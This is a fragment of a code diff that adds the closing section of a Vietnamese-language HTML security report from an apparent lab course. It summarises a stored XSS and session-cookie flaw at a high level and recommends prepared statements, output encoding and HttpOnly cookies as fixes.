+                        <li><strong>Cross-Site Scripting (XSS):</strong> Lỗ hổng Stored XSS kết hợp với việc thiếu cờ bảo vệ <code>HttpOnly</code> trên Cookie phiên cho phép kẻ tấn công chiếm toàn quyền tài khoản quản trị viên chỉ với một payload đơn giản trong phần nhận xét sản phẩm.</li>
+                    </ul>
+                    <p style="margin-bottom: 0;">
+                        Các giải pháp khắc phục triệt để nhất là: <strong>Áp dụng Prepared Statements (PDO)</strong> cho 100% truy vấn CSDL, <strong>HTML Entity Encoding</strong> cho toàn bộ dữ liệu đầu ra và <strong>bật cờ HttpOnly</strong> cho tất cả các cookie phiên xác thực.
+                    </p>
+                </div>
+            </section>
+
+            <footer class="report-footer">
+                <div>&copy; 2026 BrewCart Security Research Lab. Báo cáo hoàn chỉnh chuẩn giáo trình an toàn thông tin.</div>
+                <div>Kiến trúc PHP MVC &bull; MariaDB 10.11 &bull; OpenSSH 8.4</div>
             </footer>
-
         </main>
     </div>
-
 </body>
 </html>
